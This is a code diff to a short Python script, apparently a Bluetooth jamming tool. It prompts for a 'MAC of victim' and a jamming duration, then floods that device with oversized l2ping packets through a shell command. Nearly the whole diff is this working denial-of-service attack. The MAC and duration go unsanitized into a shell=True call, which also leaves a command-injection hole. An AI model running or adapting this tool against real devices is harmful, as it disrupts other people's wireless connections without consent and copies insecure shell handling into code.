@@ -3,22 +3,21 @@ import subprocess
 import time
 import colorama
 from colorama import Fore, Back, Style
+import headers
+import random
 colorama.init(autoreset=True)
-print(Fore.RED + """
- _     _                  _            _   _     
-| |   | |                | |          | | | |    
-| |__ | |_   _  ___    __| | ___  __ _| |_| |__  
-| '_ \| | | | |/ _ \  / _` |/ _ \/ _` | __| '_ \ 
-| |_) | | |_| |  __/ | (_| |  __/ (_| | |_| | | |
-|_.__/|_|\__,_|\___|  \__,_|\___|\__,_|\__|_| |_|
-                                                 
-""")
+def start():
+    headers.header()
 
-mac = input("MAC: ")
-xterm_1 = "hciconfig hci0 up"
-xterm_2 = "timeout 3s l2ping -i hci0 -s 600 -f %s &" % (mac)
+start()
+
+mac = input("MAC of victim: ")
+time = input("Time of jamming: ")
+
+xterm_1 = "timeout %ss l2ping -i hci0 -s 600 -f %s &" % (time, mac)
 print("Start jamming...")
-subprocess.Popen(xterm_1,shell=True)
-subprocess.Popen(xterm_2,shell=True)
+
+subprocess.Popen(xterm_1, stdout=subprocess.PIPE , stderr=subprocess.PIPE,shell=True)
+new_try = input("")
 
 
